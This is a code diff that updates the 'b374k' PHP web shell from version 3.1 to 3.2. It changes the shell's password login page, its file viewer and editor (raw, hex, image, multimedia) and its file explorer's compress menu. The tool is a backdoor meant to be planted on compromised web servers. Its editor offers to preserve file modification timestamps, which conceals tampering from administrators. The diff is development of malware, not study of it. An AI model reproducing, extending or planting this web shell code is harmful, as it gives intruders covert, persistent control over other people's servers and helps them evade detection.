@@ -1,5 +1,5 @@
 <?php
-$GLOBALS['ver'] = "3.1";
+$GLOBALS['ver'] = "3.2";
 $GLOBALS['title'] = "b374k";
 
 @ob_start();
@@ -34,7 +34,7 @@ if(!function_exists('auth')){
 		<body style='background:#f8f8f8;color:#000000;padding:0;margin:0;'><br><p><center><noscript>You need to enable javascript</noscript></center></p>
 		<script type='text/javascript'>
 		var d = document;
-		d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:15px;width:60%;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
+		d.write(\"<br><br><form method='post'><center><input type='password' id='pass' name='pass' style='font-size:13px;width:144px;outline:none;text-align:center;background:#ffffff;padding:8px;border:1px solid #cccccc;border-radius:8px;color:#000000;'></center></form>\");
 		d.getElementById('pass').focus();
 		d.getElementById('pass').setAttribute('autocomplete', 'off');
 		</script>
@@ -538,7 +538,7 @@ if(!function_exists('view_file')){
 			elseif($type=="image"){
 				$width = (int) $image_info[0];
 				$height = (int) $image_info[1];
-				$image_info = "Image type = <span class='strong'>(</span> ".$image_info['mime']." <span class='strong'>)</span><br>
+				$image_info_h = "Image type = <span class='strong'>(</span> ".$image_info['mime']." <span class='strong'>)</span><br>
 					Image Size = <span class='strong'>( </span>".$width." x ".$height."<span class='strong'> )</span><br>";
 				if($width > 800){
 					$width = 800;
@@ -547,8 +547,8 @@ if(!function_exists('view_file')){
 				}
 				else $imglink = "";
 
-				$content = "<center>".$image_info."<br>".$imglink."
-					<img id='viewImage' width='".$width."' src='data:image/png;base64,".base64_encode(read_file($file))."' alt='".$file."'></center>
+				$content = "<center>".$image_info_h."<br>".$imglink."
+					<img id='viewImage' style='width:".$width."px;' src='data:".$image_info['mime'].";base64,".base64_encode(read_file($file))."' alt='".$file."'></center>
 	";
 
 			}
@@ -558,16 +558,16 @@ if(!function_exists('view_file')){
 							<source src='' type='".$mime."'>
 
 							</video>
-							<p><input type='button' class='button' value='Load Multimedia File' onclick=\"multimedia('".html_safe(addslashes($file))."');\"></p>
+							<p><span class='button' onclick=\"multimedia('".html_safe(addslashes($file))."');\">Load Multimedia File</span></p>
 							</center>";
 			}
 			elseif($type=="edit"){
 				$preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":"";
-				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><input type='button' class='button' value='save' onclick=\"edit_save_raw();\"></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">".html_safe(read_file($file))."</textarea></td></tr></table>";
+				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_raw');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_raw();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_raw');\">".html_safe(read_file($file))."</textarea></td></tr></table>";
 			}
 			elseif($type=="hex"){
 				$preservecbox = ($preserveTimestamp=='true')? " cBoxSelected":"";
-				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><input type='button' class='button' value='save' onclick=\"edit_save_hex();\"></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">".bin2hex(read_file($file))."</textarea></td></tr></table>";
+				$content = "<table id='editTbl'><tr><td colspan='2'><input type='text' id='editFilename' class='colSpan' value='".html_safe($file)."' onkeydown=\"trap_enter(event, 'edit_save_hex');\"></td></tr><tr><td class='colFit'><span class='button' onclick=\"edit_save_hex();\">save</span></td><td style='vertical-align:middle;'><div class='cBox".$preservecbox."'></div><span>preserve modification timestamp</span><span id='editHexResult'></span></td></tr><tr><td colspan='2'><textarea id='editInput' spellcheck='false' onkeydown=\"trap_ctrl_enter(this, event, 'edit_save_hex');\">".bin2hex(read_file($file))."</textarea></td></tr></table>";
 			}
 			else $content = "<pre>".html_safe(read_file($file))."</pre>";
 
@@ -583,13 +583,13 @@ if(!function_exists('view_file')){
 	<tr><td>Last modified</td><td>".@date("d-M-Y H:i:s",filemtime($file))."</td></tr>
 	<tr><td>Last accessed</td><td>".@date("d-M-Y H:i:s",fileatime($file))."</td></tr>
 	<tr data-path='".html_safe($file)."'><td colspan='2'>
-	<input type='button' class='navigate button' style='width:120px;' value='explorer'>
-	<input type='button' class='action button' style='width:120px;' value='action'>
-	<input type='button' class='button' value='raw' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'raw');hide_box();\">
-	<input type='button' class='button' value='code' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'code');hide_box();\">
-	<input type='button' class='button' value='hex' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'hex');hide_box();\">
-	<input type='button' class='button' value='image' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'image');hide_box();\">
-	<input type='button' class='button' value='multimedia' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'multimedia');hide_box();\">
+	<span class='navigate button' style='width:120px;'>explorer</span>
+	<span class='action button' style='width:120px;'>action</span>
+	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'raw');hide_box();\">raw</span>
+	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'code');hide_box();\">code</span>
+	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'hex');hide_box();\">hex</span>
+	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'image');hide_box();\">image</span>
+	<span class='button' style='width:120px;' onclick=\"view('".html_safe(addslashes($file))."', 'multimedia');hide_box();\">multimedia</span>
 	</td></tr>
 	<tr><td colspan='2'><div id='viewFilecontent'>".$content."</div></td></tr>
 	</table>";
@@ -751,8 +751,11 @@ if(!function_exists('show_all_files')){
 		<option>compress (tar)</option>
 		<option>compress (tar.gz)</option>
 		<option>compress (zip)</option>
+		<option disabled>------------</option>
 		</select>
-		</td><td colspan='".$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td></tr>";
+		</td><td colspan='".$colspan."'></td></tr>
+		<tr><td></td><td colspan='".++$colspan."'>".$totalFiles." file(s), ".$totalFolders." Folder(s)<span class='xplSelected'></span></td></tr>
+		";
 		$output .= "</tfoot></table>";
 		return $output;
 	}
